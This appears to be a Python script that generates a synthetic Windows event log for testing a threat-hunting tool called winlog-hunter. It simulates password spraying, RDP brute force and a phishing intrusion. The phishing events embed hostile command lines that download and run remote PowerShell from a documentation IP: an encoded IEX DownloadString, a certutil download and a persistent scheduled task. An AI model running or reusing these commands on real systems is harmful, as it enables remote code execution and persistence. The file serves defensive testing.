"""Genera un escenario de ataque sintético para probar winlog-hunter.

Uso:  python samples/generate_samples.py

Escribe samples/escenario_ataque.jsonl: unas tres horas de actividad normal de
una pyme ficticia (CORP) mezclada con dos intrusiones:

  1. Password spraying y fuerza bruta por RDP contra SRV-APP desde Internet.
  2. Phishing: un documento de Word en WS-CONTA01 lanza PowerShell codificado,
     descarga herramientas, crea persistencia, se mueve lateralmente, crea una
     cuenta de administrador y borra el registro de seguridad del DC.

Todas las IPs públicas son de documentación (RFC 5737). Nada de esto es real.
"""

from __future__ import annotations

import base64
import json
import random
from datetime import datetime, timedelta, timezone
from pathlib import Path

random.seed(7)
BASE = datetime(2026, 11, 3, 7, 30, tzinfo=timezone.utc)
DOMAIN = "CORP"
DOMAIN_SID = "S-1-5-21-1004336348-1177238915-682003330"

SECURITY = ("Security", "Microsoft-Windows-Security-Auditing")
SYSTEM_SCM = ("System", "Service Control Manager")
SYSMON = ("Microsoft-Windows-Sysmon/Operational", "Microsoft-Windows-Sysmon")

USERS = {
    "mlopez": ("WS-CONTA01", "10.0.0.21"),
    "jgarcia": ("WS-RRHH02", "10.0.0.34"),
    "aperez": ("WS-VENTAS03", "10.0.0.47"),
    "lsanchez": ("WS-IT04", "10.0.0.52"),
    "cmartin": ("WS-DIR05", "10.0.0.63"),
}
SERVERS = ["DC01", "SRV-FILES"]

events: list[dict] = []


def at(minutes: float) -> datetime:
    return BASE + timedelta(minutes=minutes)


def add(ts: datetime, event_id: int, computer: str, source: tuple[str, str], **data: str) -> None:
    events.append(
        {
            "TimeCreated": ts.isoformat(timespec="milliseconds").replace("+00:00", "Z"),
            "EventID": event_id,
            "Computer": computer,
            "Channel": source[0],
            "Provider": source[1],
            "EventData": {k: str(v) for k, v in data.items()},
        }
    )


def logon(ts, computer, user, logon_type, ip, ws="-"):
    add(ts, 4624, computer, SECURITY, TargetUserName=user, TargetDomainName=DOMAIN,
        LogonType=logon_type, IpAddress=ip, WorkstationName=ws,
        TargetLogonId=hex(random.randint(0x100000, 0xFFFFFF)), LogonProcessName="NtLmSsp")


def failed(ts, computer, user, logon_type, ip, sub="0xC000006A", ws="-"):
    add(ts, 4625, computer, SECURITY, TargetUserName=user, TargetDomainName=DOMAIN,
        LogonType=logon_type, IpAddress=ip, WorkstationName=ws,
        Status="0xC000006D", SubStatus=sub)


def process(ts, computer, user, image, command, parent, parent_cmd=""):
    add(ts, 1, computer, SYSMON, UtcTime=ts.strftime("%Y-%m-%d %H:%M:%S.%f")[:-3],
        Image=image, CommandLine=command, ParentImage=parent, ParentCommandLine=parent_cmd,
        User=f"{DOMAIN}\\{user}", ProcessId=random.randint(1000, 9000))


def encode_ps(script: str) -> str:
    return base64.b64encode(script.encode("utf-16-le")).decode()


# --------------------------------------------------------------------------- #
# Actividad normal
# --------------------------------------------------------------------------- #

for user, (ws, ip) in USERS.items():
    start = random.uniform(0, 25)
    logon(at(start), ws, user, "2", "127.0.0.1")
    process(at(start + 1), ws, user, r"C:\Windows\explorer.exe", "C:\\Windows\\Explorer.EXE",
            r"C:\Windows\System32\userinit.exe")
    process(at(start + 3), ws, user, r"C:\Program Files\Google\Chrome\Application\chrome.exe",
            '"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"', r"C:\Windows\explorer.exe")
    process(at(start + 5), ws, user, r"C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE",
            '"C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"', r"C:\Windows\explorer.exe")
    for _ in range(4):
        logon(at(random.uniform(start, 180)), random.choice(SERVERS), user, "3", ip, ws)

for _ in range(120):  # cuentas de equipo contra el DC
    ws, ip = random.choice(list(USERS.values()))
    logon(at(random.uniform(0, 180)), "DC01", f"{ws}$", "3", ip)

for user in ("jgarcia", "cmartin", "aperez"):  # algún error al teclear la contraseña
    ws, _ = USERS[user]
    t = random.uniform(10, 170)
    failed(at(t), ws, user, "2", "127.0.0.1")
    logon(at(t + 0.2), ws, user, "2", "127.0.0.1")

process(at(42), "WS-IT04", "lsanchez", r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
        "powershell.exe -NoProfile -Command Get-Service | Where-Object Status -eq 'Stopped'",
        r"C:\Windows\explorer.exe")
process(at(65), "WS-VENTAS03", "aperez", r"C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE",
        '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" "\\\\SRV-FILES\\ventas\\Q4.xlsx"',
        r"C:\Windows\explorer.exe")
add(at(20), 7045, "WS-DIR05", SYSTEM_SCM, ServiceName="Google Update Service (gupdate)",
    ImagePath='"C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe" /svc',
    ServiceType="user mode service", StartType="auto start", AccountName="LocalSystem")
add(at(21), 4698, "WS-DIR05", SECURITY, SubjectUserName="SYSTEM", TaskName="\\GoogleUpdateTaskMachineUA",
    TaskContent="<Task><Actions><Exec><Command>C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe"
    "</Command><Arguments>/ua /installsource scheduler</Arguments></Exec></Actions></Task>")

# --------------------------------------------------------------------------- #
# Intrusión 1: spraying y fuerza bruta por RDP contra SRV-APP
# --------------------------------------------------------------------------- #

spray_ip = "198.51.100.23"
for i, user in enumerate(["administrador", "admin", "backup", "soporte", "jgarcia", "aperez",
                          "cmartin", "scanner", "invitado"]):
    sub = "0xC000006A" if user in USERS or user == "administrador" else "0xC0000064"
    failed(at(60 + i / 6), "DC01", user, "3", spray_ip, sub=sub, ws="kali")

brute_ip = "203.0.113.50"
for i in range(15):
    failed(at(100 + i * 0.2), "SRV-APP", "administrador", "10", brute_ip, ws="WIN-8J2K1")
logon(at(103.5), "SRV-APP", "administrador", "10", brute_ip, "WIN-8J2K1")

# --------------------------------------------------------------------------- #
# Intrusión 2: phishing en WS-CONTA01
# --------------------------------------------------------------------------- #

word = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
ps = r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
stage = encode_ps(f"IEX (New-Object Net.WebClient).DownloadString('http://{brute_ip}/stage2.ps1')")

process(at(129), "WS-CONTA01", "mlopez", word,
        f'"{word}" /n "C:\\Users\\mlopez\\Downloads\\Factura_Noviembre.docm"', r"C:\Windows\explorer.exe")
process(at(130), "WS-CONTA01", "mlopez", ps, f"powershell.exe -nop -w hidden -enc {stage}", word)
process(at(132), "WS-CONTA01", "mlopez", r"C:\Windows\System32\certutil.exe",
        f"certutil.exe -urlcache -split -f http://{brute_ip}/tools.zip C:\\Users\\Public\\tools.zip", ps)
add(at(135), 4698, "WS-CONTA01", SECURITY, SubjectUserName="mlopez", SubjectDomainName=DOMAIN,
    TaskName="\\Microsoft\\Windows\\WindowsUpdate\\UpdateCheck",
    TaskContent="<Task><Triggers><LogonTrigger/></Triggers><Actions><Exec>"
    "<Command>powershell.exe</Command>"
    f"<Arguments>-w hidden -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://{brute_ip}/b.ps1')\""
    "</Arguments></Exec></Actions></Task>")

for minutes, server in ((140, "SRV-FILES"), (143, "SRV-APP"), (146, "SRV-BACKUP"), (149, "DC01")):
    logon(at(minutes), server, "mlopez", "3", "10.0.0.21", "WS-CONTA01")
add(at(144), 7045, "SRV-APP", SYSTEM_SCM, ServiceName="PSEXESVC", ImagePath="%SystemRoot%\\PSEXESVC.exe",
    ServiceType="user mode service", StartType="demand start", AccountName="LocalSystem")

add(at(152), 4720, "DC01", SECURITY, TargetUserName="soporte_tmp", TargetDomainName=DOMAIN,
    TargetSid=f"{DOMAIN_SID}-1145", SubjectUserName="mlopez", SubjectDomainName=DOMAIN)
add(at(153), 4732, "DC01", SECURITY, TargetUserName="Administradores", TargetSid="S-1-5-32-544",
    MemberName="-", MemberSid=f"{DOMAIN_SID}-1145", SubjectUserName="mlopez")
add(at(154), 4728, "DC01", SECURITY, TargetUserName="Admins. del dominio", TargetSid=f"{DOMAIN_SID}-512",
    MemberName="CN=soporte_tmp,CN=Users,DC=corp,DC=local", MemberSid=f"{DOMAIN_SID}-1145",
    SubjectUserName="mlopez")
add(at(160), 1102, "DC01", ("Security", "Microsoft-Windows-Eventlog"),
    SubjectUserName="mlopez", SubjectDomainName=DOMAIN)

# --------------------------------------------------------------------------- #

events.sort(key=lambda e: e["TimeCreated"])
out = Path(__file__).with_name("escenario_ataque.jsonl")
with out.open("w", encoding="utf-8", newline="\n") as fh:
    for event in events:
        fh.write(json.dumps(event, ensure_ascii=False) + "\n")
print(f"{len(events)} eventos escritos en {out}")
